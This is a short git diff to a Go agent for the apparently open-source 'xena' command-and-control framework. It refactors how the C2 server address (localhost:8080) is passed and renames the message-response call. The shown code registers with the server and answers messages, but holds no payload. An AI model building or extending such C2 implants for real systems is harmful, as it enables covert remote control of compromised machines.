@@ -9,11 +9,12 @@ import (
 	xena "github.com/zarkones/xena-client"
 )
 
-const C2_HOST = "http://127.0.0.1:8080"
+var C2_HOST = "http://127.0.0.1:8080"
+
 const C2_TIMEOUT = time.Minute
 
 func main() {
-	xena.Init(C2_HOST, C2_TIMEOUT)
+	xena.Init(&C2_HOST, C2_TIMEOUT)
 
 	hostname, err := os.Hostname()
 	if err != nil {
@@ -46,7 +47,7 @@ func main() {
 				output = "pong"
 			}
 
-			if err := xena.RespondToMessage(msg.ID, output); err != nil {
+			if err := xena.AgentRespondToMessage(msg.ID, output); err != nil {
 				fmt.Println(err)
 				continue
 			}
